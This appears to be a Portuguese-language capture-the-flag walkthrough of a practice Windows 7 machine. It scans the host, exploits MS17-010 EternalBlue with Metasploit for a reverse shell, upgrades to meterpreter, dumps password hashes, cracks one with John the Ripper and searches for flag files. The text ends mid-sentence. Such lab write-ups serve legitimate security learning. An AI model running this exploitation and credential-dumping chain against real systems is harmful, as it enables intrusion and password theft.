Primeiramente eu comecei escaneando a máquina para verificar as portas abertas.

```
nmap 10.10.168.234 -sV -O
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-04 17:31 -03
Nmap scan report for 10.10.168.234
Host is up (0.23s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/4%OT=135%CT=1%CU=35994%PV=Y%DS=2%DC=I%G=Y%TM=61FD8EB
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M506NW8ST11%O2=M506NW8ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M5
OS:06NW8ST11%O6=M506ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M506NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 399.94 seconds                                                             
```

Analisei que haviam 9 portas abertas e uma delas identificava que o sistema operacional era o windows. Fui na internet para procurar por alguma vulnerabilidade para aquela porta. Achei este [link](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) que me ajudou a entender o problema.

## Segunda tarefa

Agora chegou o momento de ganhar acesso dessa máquina. Inicializei o metasploit com o comando

```
msfconsole
```

Quando entrei no metasploit, utilizei o comando search, como indicava este [link](https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/).

```
search eternalblue
```

```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

```

Depois disso, eu utilizei o comando 'use' para utilizar o módulo acima do eternalblue.

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
```

```
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

Depois disso, analisei as opções que eu tinha para o exploit e descobri as seguintes:

```
sf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2,
                                              Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Win
                                             dows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Wi
                                             ndows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.15.70    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

```

Ainda seguindo o artigo, eu configurei o ip da máquina com o seguinte comando:

```
set rhosts 10.10.168.234
```

```
rhosts => 10.10.168.234
```

Após isto, utilizei o seguinte comando:

```
set payload windows/x64/shell/reverse_tcp
```

Depois disso, segui as instruções do THM e utilizei o comando exploit/run. O comando me deu o seguinte resultado:

```
[*] Started reverse TCP handler on 192.168.15.70:4444 
[*] 10.10.45.201:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.45.201:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.45.201:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.45.201:445 - The target is vulnerable.
[*] 10.10.45.201:445 - Connecting to target for exploitation.
[+] 10.10.45.201:445 - Connection established for exploitation.
[+] 10.10.45.201:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.45.201:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.45.201:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.45.201:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.45.201:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.45.201:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.45.201:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.45.201:445 - Sending all but last fragment of exploit packet
[*] 10.10.45.201:445 - Starting non-paged pool grooming
[+] 10.10.45.201:445 - Sending SMBv2 buffers
[+] 10.10.45.201:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.45.201:445 - Sending final SMBv2 buffers.
[*] 10.10.45.201:445 - Sending last fragment of exploit packet!
[*] 10.10.45.201:445 - Receiving response from exploit packet
[+] 10.10.45.201:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.45.201:445 - Sending egg to corrupted connection.
[*] 10.10.45.201:445 - Triggering free of corrupted buffer.
[-] 10.10.45.201:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.45.201:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.45.201:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.45.201:445 - Connecting to target for exploitation.
[+] 10.10.45.201:445 - Connection established for exploitation.
[+] 10.10.45.201:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.45.201:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.45.201:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.45.201:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.45.201:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.45.201:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.45.201:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.45.201:445 - Sending all but last fragment of exploit packet
[*] 10.10.45.201:445 - Starting non-paged pool grooming
[+] 10.10.45.201:445 - Sending SMBv2 buffers
[+] 10.10.45.201:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.45.201:445 - Sending final SMBv2 buffers.
[*] 10.10.45.201:445 - Sending last fragment of exploit packet!
[*] 10.10.45.201:445 - Receiving response from exploit packet
[+] 10.10.45.201:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.45.201:445 - Sending egg to corrupted connection.
[*] 10.10.45.201:445 - Triggering free of corrupted buffer.
[-] 10.10.45.201:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.45.201:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.45.201:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.45.201:445 - Connecting to target for exploitation.
[+] 10.10.45.201:445 - Connection established for exploitation.
[+] 10.10.45.201:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.45.201:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.45.201:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.45.201:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.45.201:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.45.201:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.45.201:445 - Trying exploit with 22 Groom Allocations.
[*] 10.10.45.201:445 - Sending all but last fragment of exploit packet
[*] 10.10.45.201:445 - Starting non-paged pool grooming
[+] 10.10.45.201:445 - Sending SMBv2 buffers
[+] 10.10.45.201:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.45.201:445 - Sending final SMBv2 buffers.
[*] 10.10.45.201:445 - Sending last fragment of exploit packet!
[*] 10.10.45.201:445 - Receiving response from exploit packet
[+] 10.10.45.201:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.45.201:445 - Sending egg to corrupted connection.
[*] 10.10.45.201:445 - Triggering free of corrupted buffer.
[-] 10.10.45.201:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.45.201:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.45.201:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Exploit completed, but no session was created.

```

## Escalate

Como atualizar shells no metasploit

Agora eu devo aprender como fazer com que um shell se torne um meterpreter. Para isso, fui pesquisar e achei o seguinte:

- Primeiro, coloquei como segunda instância a sessão atual (Ctrl + Z)
- Usei o comando ```search shell_to_meterpreter```
```
Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
```
- Depois disso, usei o módulo apresentado
- Visualizei as sessões utilizando o comando ```sessions -l```
- Mostrei as opções que teria naquela sessão utilizando ````show options```

```
Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will
                                       try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on
```

- Coloquei a sessão indicada com ```sessions -u <número da sessão>```

```
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.9.3.128:4433 
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (175174 bytes) to 10.10.1.121
[*] Meterpreter session 2 opened (10.9.3.128:4433 -> 10.10.1.121:49172 ) at 2022-02-18 17:24:36 -0300
[*] Stopping exploit/multi/handler
```

```
Active sessions
===============

  Id  Name  Type                     Information                                              Connection
  --  ----  ----                     -----------                                              ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] ----  10.9.3.128:4444 -> 10.10.229.111:49215  (10.10.229.111)
                                     -
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC  
```

- Depois disso eu selecionei a seção usando ````sessions <número sessão>```

- Rodei o seguinte comando ```getsystem```

```Already running as SYSTEM```

- Depois rodei ```whoami```

```
nt authority\system
```

- No meterpreter, eu listei todos os processos que estavam rodando usando ```ps```

```
Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 540   532   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 544   684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 588   532   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 600   580   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 640   580   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 684   588   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 708   588   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 712   684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 716   588   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 820   684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 892   684   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 940   684   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1008  640   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 1120  684   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1164  524   powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 1212  684   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1344  684   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1380  684   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1436  684   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1500  684   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1612  684   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1880  1164  powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
 1924  684   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2108  820   WmiPrvSE.exe
 2196  540   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2204  1880  cmd.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\cmd.exe
 2596  684   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 2708  1344  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2716  540   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2860  684   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2888  684   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2924  684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2972  684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 3004  684   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 3024  540   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
```

Achei o service.exe que é de id 684

- Depois disso eu migrei para o processo demonstrado utilizando o comando ```migrate <proccess id>```

```
meterpreter > migrate 684
[*] Migrating from 1880 to 684...
[*] Migration completed successfully.
```

- Utilizei então o comando ```hashdump```.  This will dump all of the passwords on the machine as long as we have the correct privileges to do so.
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

- Agora usei o john the ripper duas vezes para entender qual o problema na primeira vez:

```
┌──(ellie㉿Asgard)-[~/Desktop]
└─$ john -wordlist=rockyou.txt hashJon.txt                                                                                                         1 ⚙
Warning: detected hash type "LM", but the string is also recognized as "NT"
Use the "--format=NT" option to force loading these as that type instead
Using default input encoding: UTF-8
Using default target encoding: CP850
Loaded 1 password hash (LM [DES 256/256 AVX2])
No password hashes left to crack (see FAQ)
                                                                                                                                                       
┌──(ellie㉿Asgard)-[~/Desktop]
└─$ john --format=nt -wordlist=rockyou.txt hashJon.txt                                                                                             1 ⚙
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)     
1g 0:00:00:00 DONE (2022-02-18 18:29) 1.960g/s 20000Kp/s 20000Kc/s 20000KC/s alr19882006..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

# Encontrando as flags

Ainda no meterpreter, eu utilizei o comando ```pwd``` para saber o local que estou no computador. Então, encontrei um arquivo chamado flag1.txt.

Após achar esse arquivo, utilizei o seguinte comando:

```
meterpreter > search -f flag*.txt
Found 3 results...
==================

Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Users\Jon\Documents\flag3.txt      37            2019-03-17 16:26:36 -0300
c:\Windows\System32\config\flag2.txt  34            2019-03-17 16:32:48 -0300
c:\flag1.txt                          24            2019-03-17 16:27:21 -0300
```

Para achar as outras flags


